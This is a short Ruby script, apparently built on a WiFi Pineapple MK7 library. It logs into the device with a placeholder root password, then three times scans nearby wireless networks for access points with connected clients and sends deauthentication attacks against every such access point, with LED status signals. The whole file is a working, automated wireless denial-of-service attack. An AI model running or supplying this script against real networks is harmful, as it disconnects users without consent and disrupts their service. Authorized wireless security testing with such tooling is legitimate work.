require_relative('../../classes/PineappleMK7.rb')

system_authentication = PineappleMK7::System::Authentication.new
system_authentication.host = "172.16.42.1"
system_authentication.port = 1471
system_authentication.mac = "00:13:37:DD:EE:FF"
system_authentication.password = "<ROOT-ACCOUNT-PASSWORD>"

if (system_authentication.login)

    led = PineappleMK7::System::LED.new

    # SETUP
    #
    led.setup

    reset_settings = PineappleMK7::Modules::PineAP::Settings.new
    reset_settings.save

    TIMES = 3
    recon_scanning = PineappleMK7::Modules::Recon::Scanning.new
    SCAN_TIME = 120
    
    INTERVAL = 10

    TIMES.times do

        # ATTACK 1
        #
        led.attack

        scanID = (recon_scanning.start(SCAN_TIME)).scanID
        output = recon_scanning.output(scanID)

        # SPECIAL
        #
        led.special

        ap_clients = []
        (output.APResults).each do |ap|
            if (!ap.clients.nil?)
                ap_clients << ap
            end
        end

        # ATTACK 2
        #
        led.attack

        if (ap_clients.size > 0)
            puts('[+] Clients deauthenticated')
            ap_clients.each do |ap|
                recon_scanning.deauth_ap(ap)
                pp(ap)
                sleep(INTERVAL)
            end
        end

        # FINISH
        #
        led.finish

        # CLEANUP
        #
        led.cleanup

        recon_scanning.delete(scanID)

    end

    # OFF
    #
    led.off

end